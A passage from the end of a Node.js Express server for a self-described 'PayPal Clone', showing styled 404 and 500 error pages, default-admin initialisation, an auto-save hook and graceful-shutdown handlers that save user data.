        success: true, 
        message: `User ${userData.name} (${userData.email}) deleted successfully` 
    });
});

// ==================== ERROR HANDLING ====================

// 404 handler
app.use((req, res) => {
    res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>404 - Page Not Found</title>
            <link rel="icon" href="/favicon.ico">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #f5f7fa 0%, #e4edf5 100%);
                }
                .error-container {
                    text-align: center;
                    padding: 40px;
                    background: white;
                    border-radius: 15px;
                    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
                }
                h1 {
                    color: #003087;
                    font-size: 3rem;
                    margin-bottom: 10px;
                }
                p {
                    color: #666;
                    margin-bottom: 20px;
                }
                a {
                    display: inline-block;
                    padding: 10px 20px;
                    background: #0070ba;
                    color: white;
                    text-decoration: none;
                    border-radius: 5px;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="error-container">
                <h1>404</h1>
                <p>Page not found</p>
                <a href="/">Go to Homepage</a>
            </div>
        </body>
        </html>
    `);
});

// Global error handler
app.use((err, req, res, next) => {
    console.error('Server Error:', err);
    res.status(500).send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>500 - Server Error</title>
            <link rel="icon" href="/favicon.ico">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    background: linear-gradient(135deg, #f5f7fa 0%, #e4edf5 100%);
                }
                .error-container {
                    text-align: center;
                    padding: 40px;
                    background: white;
                    border-radius: 15px;
                    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
                }
                h1 {
                    color: #dc3545;
                    font-size: 3rem;
                    margin-bottom: 10px;
                }
                p {
                    color: #666;
                    margin-bottom: 20px;
                }
                a {
                    display: inline-block;
                    padding: 10px 20px;
                    background: #0070ba;
                    color: white;
                    text-decoration: none;
                    border-radius: 5px;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <div class="error-container">
                <h1>500</h1>
                <p>Internal server error. Please try again later.</p>
                <a href="/">Go to Homepage</a>
            </div>
        </body>
        </html>
    `);
});

// Initialize server
const initializeServer = () => {
    // Initialize data directory
    initializeDataDirectory();
    
    // Initialize default admin
    initializeDefaultAdmin();
    
    // Start auto-save
    autoSaveData();
    
    // Start server
    const server = app.listen(PORT, '0.0.0.0', () => {
        console.log(`\n🚀 ========================================== 🚀`);
        console.log(`✅ PayPal Clone is running!`);
        console.log(`🌐 Server running on port: ${PORT}`);
        console.log(`🔐 Admin Login: /admin-login`);
        console.log(`📁 Data Directory: ${DATA_DIR}`);
        console.log(`📁 Uploads Directory: ${UPLOADS_DIR}`);
        console.log(`📝 Using persistent storage: ${process.env.RENDER ? 'YES (Render Disk)' : 'NO (Local)'}`);
        console.log(`🚀 ========================================== 🚀\n`);
    });
    
    // Handle graceful shutdown
    process.on('SIGTERM', () => {
        console.log('SIGTERM signal received: closing HTTP server');
        
        // Save all data before shutdown
        try {
            const users = getUsers();
            saveUsers(users);
            console.log('Users data saved before shutdown');
        } catch (error) {
            console.error('Error saving data on shutdown:', error);
        }
        
        server.close(() => {
            console.log('HTTP server closed');
            process.exit(0);
        });
    });
    
    process.on('SIGINT', () => {
        console.log('SIGINT signal received: closing HTTP server');
        
        try {
            const users = getUsers();
            saveUsers(users);
            console.log('Users data saved before shutdown');
        } catch (error) {
            console.error('Error saving data on shutdown:', error);
        }
        
        server.close(() => {
            console.log('HTTP server closed');
            process.exit(0);
        });
    });
    
    return server;
};

// Start the server
initializeServer();
